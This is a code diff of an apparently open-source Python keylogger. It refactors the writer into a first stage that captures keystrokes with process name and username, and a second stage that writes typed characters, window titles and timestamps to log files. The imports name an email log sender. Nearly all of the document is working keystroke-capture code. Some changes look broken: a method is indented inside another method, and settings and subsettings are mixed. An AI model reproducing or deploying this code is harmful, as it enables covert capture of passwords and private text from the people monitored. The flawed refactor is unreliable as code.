@@ -1,6 +1,7 @@
 from threading import Thread, Event, RLock
-from myutils import _settings, _cmdoptions, OnDemandRotatingFileHandler
-from Queue import Queue
+from myutils import (_settings, _cmdoptions, OnDemandRotatingFileHandler,
+    to_unicode)
+from Queue import Queue, Empty
 from timerthreads import (LogRotator, LogFlusher, OldLogDeleter, LogZipper,
     EmailLogSender)
 
@@ -62,8 +63,9 @@ class BaseEventClass(Thread):
 class FirstStageBaseEventClass(BaseEventClass):
     '''Adds system attributes to events from hook queue, and passes them on.
     
-    These classes also serve as the "controller" classes, and spawn
-    all the related timer-based threads for the logger.'''
+    These classes also serve as the "controller" classes. They create
+    the logger, and spawn all the related timer-based threads for the logger.
+    '''
 
     def __init__(self, *args, **kwargs):
         
@@ -73,6 +75,7 @@ class FirstStageBaseEventClass(BaseEventClass):
                 
         self.create_loggers()
         self.spawn_timer_threads()
+        self.spawn_second_stage_thread()
     
     def create_loggers(self):
         
@@ -98,9 +101,9 @@ class FirstStageBaseEventClass(BaseEventClass):
             except KeyError:
                 pass # this is not a thread to be started.
     
-    def spawn_second_stage_thread(self):
-        self.sst_queue = Queue(0)
-        self.sst = SecondStageEventClass(self.dir_lock, self.loggername)
+    def spawn_second_stage_thread(self): # override in derived class
+        self.sst_q = Queue(0)
+        self.sst = SecondStageEventClass(self.dir_lock, self.sst_q, self.loggername)
         
 
 class SecondStageBaseEventClass(BaseEventClass):
@@ -118,10 +121,10 @@ class SecondStageBaseEventClass(BaseEventClass):
                 
 
 class DetailedLogWriterFirstStage(FirstStageBaseEventClass):
-    '''Standard detailed log writer.
+    '''Standard detailed log writer, first stage.
     
-    Logs key events, and various attributes of process/window that 
-    receive them.
+    Grabs keyboard events, finds the process name and username, then 
+    passes the event on to the second stage.
     '''
     
     def __init__(self, *args, **kwargs):
@@ -129,63 +132,36 @@ class DetailedLogWriterFirstStage(FirstStageBaseEventClass):
         FirstStageBaseEventClass.__init__(self, *args, **kwargs)
         
         self.task_function = self.process_event
-        
-        self.eventlist = range(7) #initialize our eventlist to something.
-        
-        if self.subsettings['General']['Log Key Count'] == True:
-            self.eventlist.append(7)
-    
+            
     def process_event(self):
         try:
             event = self.q.get(timeout=0.2) #need the timeout so that thread terminates properly when exiting
             process_name = self.get_process_name(event)
-            loggable = self.needs_logging(event)  # see if the program is in the no-log list.
+            loggable = self.needs_logging(event, process_name)  # see if the program is in the no-log list.
             if not loggable:
                 logging.getLogger('').debug("not loggable, we are outta here\n")
                 return
-            logging.getLogger('').debug("loggable, lets log it. key: " + str(event.Key))
+            logging.getLogger('').debug("loggable, lets log it. key: %s" % \
+                to_unicode(event.Key))
             
-            # try a few different environment vars to get the username
-            for varname in ['USERNAME','USER','LOGNAME']:
-                username = os.getenv(varname)
-                if username is not None:
-                    break
-            if username is None:
-                username = 'none'
-                
-            eventlisttmp = [myutils.to_unicode(time.strftime('%Y%m%d')), # date
-                            myutils.to_unicode(time.strftime('%H%M')), # time
-                            myutils.to_unicode(self.GetProcessName(event)).replace(self.settings['General']['Log File Field Separator'], '[sep_key]'), # process name (full path on windows, just name on linux)
-                            myutils.to_unicode(event.Window), # window handle
-                            myutils.to_unicode(username).replace(self.settings['General']['Log File Field Separator'], '[sep_key]'), # username
-                            myutils.to_unicode(event.WindowName).replace(self.settings['General']['Log File Field Separator'], '[sep_key]')] # window title
-                            
-            if self.settings['General']['Log Key Count'] == True:
-                eventlisttmp = eventlisttmp + ['1',myutils.to_unicode(self.ParseEventValue(event))]
-            else:
-                eventlisttmp.append(myutils.to_unicode(self.ParseEventValue(event)))
-                
-            if (self.eventlist[:6] == eventlisttmp[:6]) and (self.settings['General']['Limit Keylog Field Size'] == 0 or (len(self.eventlist[-1]) + len(eventlisttmp[-1])) < self.settings['General']['Limit Keylog Field Size']):
-                self.eventlist[-1] = self.eventlist[-1] + eventlisttmp[-1] #append char to log
-                if self.settings['General']['Log Key Count'] == True:
-                    self.eventlist[-2] = str(int(self.eventlist[-2]) + 1) # increase stroke count
-            else:
-                self.WriteToLogFile() #write the eventlist to file, unless it's just the dummy list
-                self.eventlist = eventlisttmp
+            username = self.get_username()
+            
+            self.sst_q.put((process_name, username, event))
+            
         except Empty:
             pass #let's keep iterating
         except:
-            self.PrintDebug("some exception was caught in the logwriter loop...\nhere it is:\n", sys.exc_info())
+            logging.getLogger('').debug("some exception was caught in "
+                "the logwriter loop...\nhere it is:\n", exc_info=True)
             pass #let's keep iterating
     
-    def needs_logging(self, event):
+    def needs_logging(self, event, process_name):
         '''This function returns False if the process name associated with an event
         is listed in the noLog option, and True otherwise.'''
         
-        self.process_name = self.get_process_name(event)
         if self.settings['General']['Applications Not Logged'] != 'None':
             for path in self.settings['General']['Applications Not Logged'].split(';'):
-                if os.path.exists(path) and os.stat(path) == os.stat(self.processName):  #we use os.stat instead of comparing strings due to multiple possible representations of a path
+                if os.path.exists(path) and os.stat(path) == os.stat(process_name):  #we use os.stat instead of comparing strings due to multiple possible representations of a path
                     return False
         return True
 
@@ -207,4 +183,124 @@ class DetailedLogWriterFirstStage(FirstStageBaseEventClass):
                 # so we just return a nice string and don't worry about it.
                 return "noprocname"
         elif os.name == 'posix':
-            return unicode(event.WindowProcName, 'latin-1')
+            return to_unicode(event.WindowProcName)
+            
+        def get_username(self):
+            '''Try a few different environment vars to get the username.'''
+            username = None
+            for varname in ['USERNAME','USER','LOGNAME']:
+                username = os.getenv(varname)
+                if username is not None:
+                    break
+            if username is None:
+                username = 'none'
+            return username
+
+    def spawn_second_stage_thread(self): 
+        self.sst_q = Queue(0)
+        self.sst = DetailedLogWriterSecondStage(self.dir_lock, 
+                                                self.sst_q, self.loggername)
+
+class DetailedLogWriterSecondStage(SecondStageBaseEventClass):
+    def __init__(self, dir_lock, *args, **kwargs):
+        SecondStageBaseEventClass.__init__(self, dir_lock, *args, **kwargs)
+        
+        self.task_function = self.process_event
+        
+        self.eventlist = range(7) #initialize our eventlist to something.
+        
+        if self.subsettings['General']['Log Key Count'] == True:
+            self.eventlist.append(7)
+        
+        self.logger = logging.getLogger(self.loggername)
+        
+        # for brevity
+        self.field_sep = \
+            self.subsettings['General']['Log File Field Separator']
+            
+    def process_event(self):
+        try:
+            (process_name, username, event) = self.q.get(timeout=0.2) #need the timeout so that thread terminates properly when exiting
+            
+            eventlisttmp = [to_unicode(time.strftime('%Y%m%d')), # date
+                to_unicode(time.strftime('%H%M')), # time
+                to_unicode(process_name).replace(self.field_sep,
+                    '[sep_key]'), # process name (full path on windows, just name on linux)
+                to_unicode(event.Window), # window handle
+                to_unicode(username).replace(self.field_sep, 
+                    '[sep_key]'), # username
+                to_unicode(event.WindowName).replace(self.field_sep, 
+                    '[sep_key]')] # window title
+                            
+            if self.subsettings['General']['Log Key Count'] == True:
+                eventlisttmp.append('1')
+            eventlisttmp.append(to_unicode(self.parse_event_value(event)))
+                
+            if (self.eventlist[:6] == eventlisttmp[:6]) and \
+                (self.subsettings['General']['Limit Keylog Field Size'] == 0 or \
+                (len(self.eventlist[-1]) + len(eventlisttmp[-1])) < self.settings['General']['Limit Keylog Field Size']):
+                
+                #append char to log
+                self.eventlist[-1] = self.eventlist[-1] + eventlisttmp[-1]
+                # increase stroke count
+                if self.settings['General']['Log Key Count'] == True:
+                    self.eventlist[-2] = str(int(self.eventlist[-2]) + 1)
+            else:
+                self.write_to_logfile()
+                self.eventlist = eventlisttmp
+        except Empty:
+            pass #let's keep iterating
+        except:
+            logging.getLogger('').debug("some exception was caught in the "
+                "logwriter loop...\nhere it is:\n", exc_info=True)
+            pass #let's keep iterating
+
+    def parse_event_value(self, event):
+        '''Pass the event ascii value through the requisite filters.
+        Returns the result as a string.
+        '''
+        npchrstr = self.subsettings['General']['Non-printing Character Representation']
+        npchrstr = re.sub('%keyname%', event.Key, npchrstr)
+        npchrstr = re.sub('%scancode%', str(event.ScanCode), npchrstr)
+        npchrstr = re.sub('%vkcode%', str(event.KeyID), npchrstr)
+        
+        if chr(event.Ascii) == self.field_sep:
+            return(npchrstr)
+        
+        #translate backspace into text string, if option is set.
+        if event.Ascii == 8 and \
+                self.subsettings['General']['Parse Backspace'] == True:
+            return(npchrstr)
+        
+        #translate escape into text string, if option is set.
+        if event.Ascii == 27 and \
+                self.subsettings['General']['Parse Escape'] == True:
+            return(npchrstr)
+
+        # need to parse the returns, so as not to break up the data lines
+        if event.Ascii == 13:
+            return(npchrstr)
+            
+        # We translate all the special keys, such as arrows, backspace, 
+        # into text strings for logging.
+        # Exclude shift and capslock keys, because they are already 
+        # represented  (as capital letters/symbols).
+        if event.Ascii == 0 and \
+                not (str(event.Key).endswith('shift') or \
+                str(event.Key).endswith('Capital')):
+            return(npchrstr)
+        
+        return(chr(event.Ascii))
+
+    def write_to_logfile(self):
+        '''Write the latest eventlist to logfile in one delimited line.
+        '''
+        
+        if self.eventlist[:7] != range(7):
+            try:
+                line = to_unicode(self.field_sep).join(self.eventlist) + "\n"
+                self.logger.info(line)
+            except:
+                logging.getLogger('').debug(to_unicode(self.eventlist), 
+                    exc_info=True)
+                pass # keep going, even though this doesn't get logged...
